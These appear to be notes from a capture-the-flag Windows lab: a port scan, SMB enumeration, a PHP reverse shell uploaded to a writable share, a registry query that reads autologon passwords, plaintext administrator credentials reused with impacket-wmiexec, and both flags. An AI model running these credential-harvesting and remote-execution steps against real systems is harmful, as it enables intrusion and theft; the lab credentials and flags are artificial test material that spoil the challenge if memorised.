
10.201.24.162


```powershell
PORT     STATE SERVICE       REASON
21/tcp   open  ftp           syn-ack ttl 126
80/tcp   open  http          syn-ack ttl 126
135/tcp  open  msrpc         syn-ack ttl 126
139/tcp  open  netbios-ssn   syn-ack ttl 126
443/tcp  open  https         syn-ack ttl 126
445/tcp  open  microsoft-ds  syn-ack ttl 126
3389/tcp open  ms-wbt-server syn-ack ttl 126
5900/tcp open  vnc           syn-ack ttl 126

# UDP
137/udp  open|filtered netbios-ns  no-response
138/udp  open|filtered netbios-dgm no-response
500/udp  open|filtered isakmp      no-response
1900/udp open|filtered upnp        no-response
4500/udp open|filtered nat-t-ike   no-response
5353/udp open|filtered zeroconf    no-response
5355/udp open|filtered llmnr       no-response

```

SMB
```
Interesting files: 
./AppData/Roaming/Microsoft/Windows/SendTo/Compressed (zipped) Folder.ZFSendToTarget
./AppData/Roaming/Microsoft/Windows/SendTo/Mail Recipient.MAPIMail

```

# Foothold

```powershell
# images$ SMB share is writable and browsable
Upload IvanSincek.php shell and caught a reverse shell
```
# Banner

```powershell
crackmapexec smb $ip -u '' -p '' 
SMB         10.201.63.125   445    DESKTOP-997GG7D  [*] Windows 10 / Server 2019 Build 18362 x64 (name:DESKTOP-997GG7D) (domain:DESKTOP-997GG7D) (signing:False) (SMBv1:False)


# WinServer
Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11


```

# Creds

```powershell

#Auto Logon is enable:
reg query "HKLM\SOFTWARE\microsoft\windows nt\currentversion\winlogon"


#fetch the creds from registery 
DefaultUsername    REG_SZ    .\sign
DefaultPassword    REG_SZ    gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH


# Admin creds are found in C:Installs (Installs$ share) Install_www_and_deploy.bat:
Administrator:RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi@10.201.78.215

Administrator:RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi@10.201.78.215



```

PrivEsc
```powershell
# Admin creds are found in C:Installs (Installs$ share) Install_www_and_deploy.bat:
Administrator:RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi@10.201.78.215

impacket-wmiexec Administrator:RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi@10.201.78.215


```
# Flags

```powershell

#user flag:
>>> C:\Users\sign\Desktop>type user_flag.txt
thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}

>>> C:\Users\Administrator\Desktop>type admin_flag.txt
thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}

```


